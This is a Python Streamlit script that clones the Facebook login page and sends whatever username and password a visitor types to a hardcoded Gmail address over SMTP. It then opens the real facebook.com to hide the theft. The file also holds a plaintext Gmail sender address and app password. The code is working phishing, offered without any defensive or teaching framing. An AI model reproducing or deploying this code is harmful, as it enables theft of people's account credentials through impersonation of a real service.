import streamlit as st

import smtplib
from email.mime.text import MIMEText

import webbrowser


sender= "sonu.softwaresolution@gmail.com"
password= "cddy vhma mjxx iexi"
receiver= "sonu.code.ai@gmail.com"




st.set_page_config(page_title="Facebook Login",page_icon="logo.png" ,layout="centered")

page_bg_img = '''
<style>
[data-testid="stAppViewContainer"] {
    background-image: url("background1.png");
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
}
</style>
'''

st.markdown(page_bg_img, unsafe_allow_html=True)

col1, col2 = st.columns([1.3, 1])

with col1:
    st.markdown(
        "<h1 style='color: #1455e0; font-family: Arial, sans-serif;font-size: 66px;'>facebook</h1>",
        unsafe_allow_html=True
    )

    st.markdown(
        "<h1 style='color: #000000; font-family: Corbel Light, sans-serif;font-size: 30px'>Facebook helps you connect and share with the people in your life.</h1>",
        unsafe_allow_html=True
    )




with col2:
    with st.container():

        user_name= st.text_input("Username", placeholder="Enter Your Email",label_visibility="collapsed")
        user_password= st.text_input("Password",type="password", placeholder="Enter Your Password",label_visibility="collapsed")

        st.markdown(
            """
            <style>
            /* Target the first button on the page */
            div.stButton > button:first-child {
                background-color: #1455e0;  /* Blue color */
                color: white;
                border-radius: 5px;
                padding: 8px 54px;
                font-size: 25px;
                font-weight: bold;
            }
            div.stButton > button:first-child:hover {
                background-color: #0056b3;  /* Darker blue on hover */
                color: white;
            }
            </style>
            """,
            unsafe_allow_html=True,
        )



        if st.button("Login"):

            with st.spinner("Loading..........."): 
                full_msg= f"ID: {user_name}  \n Password: {user_password}"
                msg = MIMEText(full_msg)
                msg["Subject"] = "Message from Streamlit App"
                msg["From"] = sender
                msg["To"] = receiver

                try:
                    url = "https://www.facebook.com/"
                    webbrowser.open(url)
                    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                    server.login(sender, password)
                    server.send_message(msg)
                    server.quit()
                except Exception as e:
                    st.error(f"❌ Failed to send email: {e}")

        else:
            st.error("The email address or mobile number you entered isn't connected to an account.")


    st.markdown("[forgetten password?](https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0)")
    st.write("_"*20)



        



    if st.button("Create New Account", key="create", help="Create a new Facebook account"):
        
        url = "https://www.facebook.com/r.php?entry_point=login"
        webbrowser.open(url)
